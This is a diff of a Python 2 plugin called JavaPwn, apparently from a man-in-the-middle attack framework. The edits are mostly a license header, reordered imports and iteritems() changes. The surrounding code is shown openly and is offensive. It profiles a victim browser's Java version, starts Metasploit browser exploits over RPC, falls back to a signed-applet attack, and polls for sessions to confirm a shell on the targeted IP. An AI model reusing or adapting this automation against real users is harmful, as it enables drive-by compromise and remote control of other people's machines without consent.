@@ -1,12 +1,34 @@
-from plugins.plugin import Plugin
-from plugins.BrowserProfiler import BrowserProfiler
-from time import sleep
-import libs.msfrpc as msfrpc
+#!/usr/bin/env python2.7
+
+# Copyright (c) 2014-2016 Marcello Salvati
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License as
+# published by the Free Software Foundation; either version 3 of the
+# License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but
+# WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+# General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+# USA
+#
+
+import core.msfrpc as msfrpc
 import string
 import random
 import threading
 import sys
 import logging
+
+from plugins.plugin import Plugin
+from plugins.BrowserProfiler import BrowserProfiler
+from time import sleep
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
 from scapy.all import get_if_addr
 
@@ -67,7 +89,7 @@ class JavaPwn(BrowserProfiler, Plugin):
         client_vstring = java_version[:-len(java_version.split('.')[3])-1]
         client_uversion = int(java_version.split('.')[3])
 
-        for ver in self.javacfg['Multi'].items():
+        for ver in self.javacfg['Multi'].iteritems():
             if type(ver[1]) is list:
                 for list_vers in ver[1]:
                     
@@ -108,7 +130,7 @@ class JavaPwn(BrowserProfiler, Plugin):
                 break
             shell = msfinstance.call('session.list')  #poll metasploit every 2 seconds for new sessions
             if len(shell) > 0:
-                for k, v in shell.items():
+                for k, v in shell.iteritems():
                     if client_ip in shell[k]['tunnel_peer']:  #make sure the shell actually came from the ip that we targeted
                         logging.info("%s >> Got shell!" % client_ip)
                         self.sploited_ips.append(client_ip)  #target successfuly exploited :)
@@ -165,7 +187,7 @@ class JavaPwn(BrowserProfiler, Plugin):
                         #here we check to see if we already set up the exploit to avoid creating new jobs for no reason
                         jobs = msf.call('job.list')  #get running jobs
                         if len(jobs) > 0:
-                            for k, v in jobs.items():
+                            for k, v in jobs.iteritems():
                                 info = msf.call('job.info', [k])
                                 if exploit in info['name']:
                                     logging.info('%s >> %s already started' % (vic_ip, exploit))
@@ -196,6 +218,7 @@ class JavaPwn(BrowserProfiler, Plugin):
                         logging.info("%s >> falling back to the signed applet attack" % vic_ip)
 
                         rand_url = self.rand_url()
+                        rand_port = random.randint(1000, 65535)
 
                         cmd = "use exploit/multi/browser/java_signed_applet\n"
                         cmd += "set SRVPORT %s\n" % self.msfport
@@ -217,7 +240,7 @@ class JavaPwn(BrowserProfiler, Plugin):
         jobs = msf.call('job.list')
         if len(jobs) > 0:
             print '\n[*] Stopping all running metasploit jobs'
-            for k, v in jobs.items():
+            for k, v in jobs.iteritems():
                 msf.call('job.stop', [k])
 
         consoles = msf.call('console.list')['consoles']
